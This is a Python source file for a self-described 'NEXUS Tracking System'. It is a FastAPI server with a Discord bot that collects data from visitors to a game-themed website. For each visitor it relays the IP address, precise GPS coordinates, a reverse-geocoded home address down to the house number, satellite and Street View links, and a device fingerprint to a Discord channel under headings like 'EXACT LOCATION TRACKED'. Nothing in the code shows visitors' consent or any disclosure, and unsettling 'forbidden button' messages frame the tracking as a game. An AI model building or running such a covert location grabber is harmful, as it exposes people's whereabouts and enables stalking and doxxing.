import os
import json
import asyncio
import threading
import math
from datetime import datetime
from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
import discord
from discord.ext import commands
from discord import app_commands, Embed, Color
import uvicorn
from pydantic import BaseModel
from dotenv import load_dotenv
import traceback
import hashlib
import aiohttp

load_dotenv()

# ==================== CONFIGURATION ====================
BOT_TOKEN = os.getenv('BOT_TOKEN')
DISCORD_CHANNEL_ID = int(os.getenv('DISCORD_CHANNEL_ID', '0'))
PORT = int(os.getenv('PORT', 8000))
FRONTEND_URL = "https://gamef-swart.vercel.app"

if not BOT_TOKEN:
    print("❌ BOT_TOKEN not set in .env")
    exit(1)
if not DISCORD_CHANNEL_ID:
    print("❌ DISCORD_CHANNEL_ID not set in .env")
    exit(1)

# ==================== DATA MODELS ====================
class VisitorInfo(BaseModel):
    # Basic info
    ip: str = "N/A"
    city: str = "N/A"
    region: str = "N/A"
    country: str = "N/A"
    timezone: str = "N/A"
    userAgent: str = "N/A"
    screen: dict = {}
    browser: dict = {}
    
    # Advanced location
    location: dict = {}
    address: dict = {}
    coordinates: dict = {}
    accuracy: float = 0
    source: str = "Unknown"
    
    # System
    system: dict = {}
    fragments: list = []
    button_presses: int = 0

# ==================== SIMPLE STORAGE (No database locks) ====================
# Using in-memory storage to avoid database issues
visitors = {}
visits = []

# ==================== FASTAPI SETUP ====================
app = FastAPI(title="NEXUS Tracking System")

# CORS for frontend
app.add_middleware(
    CORSMiddleware,
    allow_origins=[FRONTEND_URL, "http://localhost:3000", "*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ==================== DISCORD BOT SETUP ====================
class NexusBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix='!', intents=intents)
        self.channel = None
        self.ready = False

bot = NexusBot()

# ==================== DISCORD EVENTS ====================
@bot.event
async def on_ready():
    print(f'✅ Logged in as {bot.user}')
    print(f'📡 Bot ID: {bot.user.id}')
    
    try:
        bot.channel = bot.get_channel(DISCORD_CHANNEL_ID)
        if not bot.channel:
            bot.channel = await bot.fetch_channel(DISCORD_CHANNEL_ID)
        
        bot.ready = True
        print(f'✅ Connected to channel: #{bot.channel.name}')
        
        embed = Embed(
            title="🔮 NEXUS SYSTEM ONLINE",
            description="```Tracking system activated\nWaiting for targets...```",
            color=Color.green(),
            timestamp=datetime.now()
        )
        embed.add_field(name="Status", value="✅ Active", inline=True)
        embed.add_field(name="Channel", value=f"#{bot.channel.name}", inline=True)
        embed.add_field(name="Frontend", value=f"[Website]({FRONTEND_URL})", inline=True)
        
        await bot.channel.send(embed=embed)
        print("✅ Startup message sent")
        
    except Exception as e:
        print(f'❌ Error: {e}')

# ==================== SATELLITE IMAGE FUNCTION ====================
def get_satellite_url(lat: float, lon: float):
    """Get satellite image URL for coordinates using ESRI"""
    zoom = 18
    x = int((lon + 180) / 360 * (2 ** zoom))
    y = int((1 - math.log(math.tan(math.radians(lat)) + 1 / math.cos(math.radians(lat))) / math.pi) / 2 * (2 ** zoom))
    
    # Using ESRI satellite imagery (free, no API key)
    return f"https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{zoom}/{y}/{x}"

# ==================== DISCORD SEND FUNCTIONS ====================
async def send_location_to_discord(user_id: str, data: dict, ip: str):
    """Send location data with full address and satellite image"""
    try:
        coords = data.get('coordinates', {})
        addr = data.get('address', {})
        loc = data.get('location', {})
        
        if not coords:
            return
        
        lat = coords.get('lat')
        lon = coords.get('lon')
        
        # MAIN LOCATION EMBED with FULL ADDRESS
        embed = Embed(
            title="📍 EXACT LOCATION TRACKED",
            color=Color.red(),
            timestamp=datetime.now()
        )
        
        # User info
        embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
        embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
        embed.add_field(name="📡 Source", value=f"`{data.get('source', 'GPS')}`", inline=True)
        embed.add_field(name="🎯 Accuracy", value=f"`{data.get('accuracy', '?')}m`", inline=True)
        
        # Coordinates
        embed.add_field(
            name="📍 Coordinates",
            value=f"```\nLatitude:  {lat:.6f}\nLongitude: {lon:.6f}```",
            inline=False
        )
        
        # FULL ADDRESS (exact format from old system)
        if loc.get('display_name'):
            embed.add_field(
                name="🏠 EXACT ADDRESS",
                value=f"```{loc.get('display_name')}```",
                inline=False
            )
        
        # ADDRESS DETAILS (house number, road, city, state, zip, country)
        details = []
        if addr.get('house_number'): 
            details.append(f"🏠 **House:** {addr.get('house_number')}")
        if addr.get('road'): 
            details.append(f"🛣️ **Road:** {addr.get('road')}")
        if addr.get('neighbourhood'): 
            details.append(f"🏘️ **Neighbourhood:** {addr.get('neighbourhood')}")
        if addr.get('suburb'): 
            details.append(f"🏘️ **Suburb:** {addr.get('suburb')}")
        if addr.get('city') or addr.get('town') or addr.get('village'): 
            city = addr.get('city') or addr.get('town') or addr.get('village')
            details.append(f"🏙️ **City:** {city}")
        if addr.get('county'): 
            details.append(f"🗺️ **County:** {addr.get('county')}")
        if addr.get('state'): 
            details.append(f"📍 **State:** {addr.get('state')}")
        if addr.get('postcode'): 
            details.append(f"📮 **ZIP:** {addr.get('postcode')}")
        if addr.get('country'): 
            details.append(f"🌍 **Country:** {addr.get('country')}")
        
        if details:
            embed.add_field(name="📋 Location Details", value="\n".join(details), inline=False)
        
        # Maps links
        maps_url = f"https://www.google.com/maps?q={lat},{lon}"
        street_url = f"https://www.google.com/maps?q={lat},{lon}&layer=c"
        
        embed.add_field(name="🗺️ Google Maps", value=f"[Open in Maps]({maps_url})", inline=True)
        embed.add_field(name="📸 Street View", value=f"[View Street]({street_url})", inline=True)
        
        await bot.channel.send(embed=embed)
        
        # SATELLITE IMAGE EMBED
        satellite_url = get_satellite_url(lat, lon)
        
        sat_embed = Embed(
            title="🛰️ SATELLITE IMAGERY",
            description=f"**Location:** {lat:.6f}, {lon:.6f}",
            color=Color.blue(),
            timestamp=datetime.now()
        )
        sat_embed.set_image(url=satellite_url)
        
        # Add location context to satellite embed
        location_context = []
        if addr.get('city') or addr.get('town'):
            location_context.append(f"📍 {addr.get('city') or addr.get('town')}")
        if addr.get('state'):
            location_context.append(addr.get('state'))
        if addr.get('country'):
            location_context.append(addr.get('country'))
        
        if location_context:
            sat_embed.add_field(name="Location", value=", ".join(location_context), inline=True)
        
        sat_embed.add_field(name="Zoom Level", value="`18`", inline=True)
        sat_embed.add_field(name="Source", value="ESRI World Imagery", inline=True)
        
        await bot.channel.send(embed=sat_embed)
        
        print(f"✅ Sent location + satellite for {user_id[:8]}")
        
    except Exception as e:
        print(f"❌ Location send error: {e}")

async def send_system_to_discord(user_id: str, data: dict, ip: str):
    """Send system fingerprint"""
    try:
        sys = data.get('system', {})
        browser = data.get('browser', {})
        
        embed = Embed(
            title="💻 SYSTEM FINGERPRINT",
            color=Color.blue(),
            timestamp=datetime.now()
        )
        
        embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
        embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
        embed.add_field(name="💿 Platform", value=f"`{sys.get('platform', '?')}`", inline=True)
        embed.add_field(name="⚡ CPU Cores", value=f"`{sys.get('cores', '?')}`", inline=True)
        embed.add_field(name="💾 RAM", value=f"`{sys.get('memory', '?')}`", inline=True)
        
        screen = sys.get('screen', {})
        if isinstance(screen, dict):
            screen_size = f"{screen.get('width', '?')}x{screen.get('height', '?')}"
        else:
            screen_size = str(screen)
        embed.add_field(name="📺 Screen", value=f"`{screen_size}`", inline=True)
        
        embed.add_field(name="⏰ Timezone", value=f"`{data.get('timezone', '?')}`", inline=True)
        embed.add_field(name="🗣️ Language", value=f"`{browser.get('language', '?')}`", inline=True)
        embed.add_field(name="🍪 Cookies", value=f"`{'Enabled' if browser.get('cookies') else 'Disabled'}`", inline=True)
        
        # Generate fingerprint
        fingerprint = hashlib.md5(
            f"{sys.get('platform')}{data.get('timezone')}{sys.get('cores')}".encode()
        ).hexdigest()[:8]
        embed.add_field(name="🆔 Fingerprint", value=f"`{fingerprint}`", inline=False)
        
        await bot.channel.send(embed=embed)
        print(f"✅ Sent system info for {user_id[:8]}")
        
    except Exception as e:
        print(f"❌ System send error: {e}")

async def send_new_visitor(user_id: str, data: dict, ip: str):
    """Send new visitor alert"""
    try:
        embed = Embed(
            title="🎯 NEW VISITOR DETECTED",
            color=Color.purple(),
            timestamp=datetime.now()
        )
        
        embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
        embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
        embed.add_field(name="📍 Location", value=f"{data.get('city', 'N/A')}, {data.get('country', 'N/A')}", inline=True)
        
        sys = data.get('system', {})
        embed.add_field(name="💻 Platform", value=f"`{sys.get('platform', 'N/A')}`", inline=True)
        
        # Get today's visitor count
        today = datetime.now().strftime('%Y-%m-%d')
        today_count = len([v for v in visitors.values() if v.get('first_seen', '').startswith(today)])
        
        embed.set_footer(text=f"Today's visitors: {today_count}")
        
        await bot.channel.send(embed=embed)
        print(f"✅ Sent new visitor alert for {user_id[:8]}")
        
    except Exception as e:
        print(f"❌ New visitor send error: {e}")

async def send_button_press(user_id: str, presses: int, ip: str):
    """Send button press alert"""
    try:
        embed = Embed(
            title="🚫 FORBIDDEN BUTTON PRESSED",
            color=Color.dark_red(),
            timestamp=datetime.now()
        )
        
        embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
        embed.add_field(name="🔢 Press Count", value=f"`{presses}`", inline=True)
        embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
        
        messages = [
            "Why did you do that?",
            "They're watching now.",
            "The button knows.",
            "Check your surroundings.",
            "Only 5 presses left...",
            "You shouldn't have done that.",
            "They know your name.",
            "It's too late now.",
            "The screen is glitching.",
            "Behind you."
        ]
        
        if presses <= len(messages):
            embed.add_field(name="💬 Message", value=f"```{messages[presses-1]}```", inline=False)
        
        if presses in [3, 6, 9]:
            embed.add_field(name="⚠️ EVENT", value="Reality fragment discovered!", inline=False)
        
        if presses == 9:
            embed.add_field(name="🔓 SECRET", value="Coordinates revealed: `60.233, 24.866`", inline=False)
        
        await bot.channel.send(embed=embed)
        print(f"✅ Sent button press {presses} for {user_id[:8]}")
        
    except Exception as e:
        print(f"❌ Button send error: {e}")

async def send_fragment(user_id: str, fragment: int, total: int, ip: str):
    """Send fragment found alert"""
    try:
        embed = Embed(
            title="🧩 REALITY FRAGMENT FOUND",
            color=Color.green(),
            timestamp=datetime.now()
        )
        
        embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
        embed.add_field(name="🧩 Fragment", value=f"`{fragment}/9`", inline=True)
        embed.add_field(name="📊 Progress", value=f"`{total}/9`", inline=True)
        embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
        
        # Progress bar
        progress = "▓" * total + "░" * (9 - total)
        embed.add_field(name="📈 Collection", value=f"`{progress}`", inline=False)
        
        await bot.channel.send(embed=embed)
        print(f"✅ Sent fragment {fragment} for {user_id[:8]}")
        
    except Exception as e:
        print(f"❌ Fragment send error: {e}")

async def send_summary(user_id: str, data: dict, ip: str):
    """Send summary of all data"""
    try:
        embed = Embed(
            title=f"📊 VISITOR SUMMARY",
            color=Color.gold(),
            timestamp=datetime.now()
        )
        
        embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
        embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
        embed.add_field(name="📍 Location", value=f"{data.get('city', 'N/A')}, {data.get('country', 'N/A')}", inline=True)
        
        if data.get('coordinates'):
            coords = data.get('coordinates', {})
            embed.add_field(
                name="📍 Coordinates", 
                value=f"`{coords.get('lat', '?')}, {coords.get('lon', '?')}`", 
                inline=True
            )
        
        sys = data.get('system', {})
        embed.add_field(
            name="💻 System", 
            value=f"`{sys.get('platform', 'N/A')}`", 
            inline=True
        )
        
        if data.get('button_presses', 0) > 0:
            embed.add_field(name="🚫 Button", value=f"`{data.get('button_presses')} presses`", inline=True)
        
        fragments = data.get('fragments', [])
        if fragments:
            embed.add_field(name="🧩 Fragments", value=f"`{len(fragments)}/9`", inline=True)
        
        # Add address snippet if available
        addr = data.get('address', {})
        if addr.get('city') or addr.get('country'):
            location_parts = []
            if addr.get('city'): location_parts.append(addr.get('city'))
            if addr.get('state'): location_parts.append(addr.get('state'))
            if addr.get('country'): location_parts.append(addr.get('country'))
            embed.add_field(name="📍 Location", value=", ".join(location_parts), inline=True)
        
        embed.set_footer(text=f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        await bot.channel.send(embed=embed)
        print(f"✅ Sent summary for {user_id[:8]}")
        
    except Exception as e:
        print(f"❌ Summary send error: {e}")

# ==================== FASTAPI ENDPOINTS ====================
@app.get("/")
async def root():
    return {
        "name": "NEXUS Tracking System",
        "status": "online",
        "bot_ready": bot.ready,
        "frontend": FRONTEND_URL,
        "channel_id": DISCORD_CHANNEL_ID,
        "visitors_today": len([v for v in visitors.values() if v.get('first_seen', '').startswith(datetime.now().strftime('%Y-%m-%d'))])
    }

@app.get("/api/health")
async def health():
    return {
        "status": "online",
        "bot_ready": bot.ready,
        "timestamp": datetime.now().isoformat()
    }

@app.post("/submit")
async def submit_visitor(request: Request, visitor: VisitorInfo):
    """Receive visitor data and send to Discord"""
    try:
        data = visitor.dict()
        client_ip = request.client.host
        
        print(f"📥 Received data from {client_ip}")
        print(f"📍 City: {data.get('city')}, Country: {data.get('country')}")
        
        # Generate user ID
        user_id = hashlib.sha256(f"{client_ip}_{data.get('userAgent', '')}".encode()).hexdigest()[:16]
        
        # Check if new user
        is_new = user_id not in visitors
        
        # Store in memory
        if is_new:
            visitors[user_id] = {
                'first_seen': datetime.now().isoformat(),
                'ip': client_ip,
                'city': data.get('city'),
                'country': data.get('country')
            }
        
        visits.append({
            'user_id': user_id,
            'timestamp': datetime.now().isoformat(),
            'data': data
        })
        
        # Send to Discord if bot is ready
        if bot.ready and bot.channel:
            # Send new visitor alert
            if is_new:
                await send_new_visitor(user_id, data, client_ip)
            
            # Send location with satellite
            if data.get('coordinates'):
                await send_location_to_discord(user_id, data, client_ip)
            
            # Send system info
            if data.get('system'):
                await send_system_to_discord(user_id, data, client_ip)
            
            # Send button presses
            if data.get('button_presses', 0) > 0:
                await send_button_press(user_id, data.get('button_presses'), client_ip)
            
            # Send fragments
            fragments = data.get('fragments', [])
            if fragments:
                for fragment in fragments:
                    await send_fragment(user_id, fragment, len(fragments), client_ip)
            
            # Send summary
            await send_summary(user_id, data, client_ip)
            
            print(f"✅ All data sent to Discord for user {user_id[:8]}")
        else:
            print(f"⚠️ Bot not ready - message not sent")
        
        return JSONResponse({
            "status": "success", 
            "user_id": user_id, 
            "is_new": is_new,
            "discord_sent": bot.ready and bot.channel is not None
        })
        
    except Exception as e:
        print(f"❌ Error: {e}")
        traceback.print_exc()
        return JSONResponse({"error": str(e)}, status_code=500)

# ==================== SLASH COMMANDS ====================
@bot.tree.command(name="stats", description="Get tracking statistics")
async def stats(interaction: discord.Interaction):
    await interaction.response.defer()
    
    total_users = len(visitors)
    total_visits = len(visits)
    
    today = datetime.now().strftime('%Y-%m-%d')
    today_visits = len([v for v in visits if v['timestamp'].startswith(today)])
    
    # Get latest location
    latest_visit = None
    latest_location = "No locations yet"
    for visit in reversed(visits):
        if visit['data'].get('coordinates'):
            latest_visit = visit
            break
    
    if latest_visit:
        coords = latest_visit['data'].get('coordinates', {})
        latest_location = f"{coords.get('lat', '?')}, {coords.get('lon', '?')}"
    
    embed = Embed(
        title="📊 NEXUS STATISTICS",
        color=Color.purple(),
        timestamp=datetime.now()
    )
    
    embed.add_field(name="Total Users", value=f"`{total_users}`", inline=True)
    embed.add_field(name="Total Visits", value=f"`{total_visits}`", inline=True)
    embed.add_field(name="Today's Visits", value=f"`{today_visits}`", inline=True)
    embed.add_field(name="Latest Location", value=f"`{latest_location}`", inline=False)
    
    await interaction.followup.send(embed=embed)

@bot.tree.command(name="recent", description="Show recent locations")
@app_commands.describe(limit="Number of locations to show (default: 5)")
async def recent(interaction: discord.Interaction, limit: int = 5):
    await interaction.response.defer()
    
    locations = []
    for visit in reversed(visits):
        if visit['data'].get('coordinates') and len(locations) < limit:
            locations.append(visit)
    
    if not locations:
        await interaction.followup.send("No locations found")
        return
    
    embed = Embed(
        title=f"📍 RECENT LOCATIONS (Last {len(locations)})",
        color=Color.blue(),
        timestamp=datetime.now()
    )
    
    for loc in locations:
        coords = loc['data'].get('coordinates', {})
        addr = loc['data'].get('address', {})
        
        location_text = addr.get('city') or f"{coords.get('lat', '?')}, {coords.get('lon', '?')}"
        time_ago = datetime.fromisoformat(loc['timestamp'])
        mins_ago = int((datetime.now() - time_ago).total_seconds() / 60)
        
        embed.add_field(
            name=f"User {loc['user_id'][:8]} - {mins_ago}m ago",
            value=f"```{location_text[:50]}```",
            inline=False
        )
    
    await interaction.followup.send(embed=embed)

@bot.tree.command(name="help", description="Show all available commands")
async def help_command(interaction: discord.Interaction):
    embed = Embed(
        title="🔮 NEXUS COMMANDS",
        description="Here are all available slash commands:",
        color=Color.purple()
    )
    
    commands = [
        "`/stats` - View tracking statistics",
        "`/recent [limit]` - Show recent locations",
        "`/help` - Show this message"
    ]
    
    embed.add_field(name="Commands", value="\n".join(commands), inline=False)
    embed.set_footer(text="NEXUS Tracking System v2.0")
    
    await interaction.response.send_message(embed=embed)

# ==================== STARTUP ====================
async def run_bot():
    try:
        await bot.start(BOT_TOKEN)
    except Exception as e:
        print(f"❌ Bot error: {e}")

def start_bot_thread():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(run_bot())

@app.on_event("startup")
async def startup_event():
    thread = threading.Thread(target=start_bot_thread, daemon=True)
    thread.start()
    print("✅ Discord bot thread started")

# ==================== RUN ====================
if __name__ == "__main__":
    print("=" * 50)
    print("🔮 NEXUS TRACKING SYSTEM")
    print("=" * 50)
    print(f"📡 Bot Token: {BOT_TOKEN[:10]}..." if BOT_TOKEN else "❌ No token")
    print(f"📡 Channel ID: {DISCORD_CHANNEL_ID}")
    print(f"🌐 Frontend: {FRONTEND_URL}")
    print(f"💻 Status: Online")
    print("=" * 50)
    
    uvicorn.run(app, host="0.0.0.0", port=PORT)
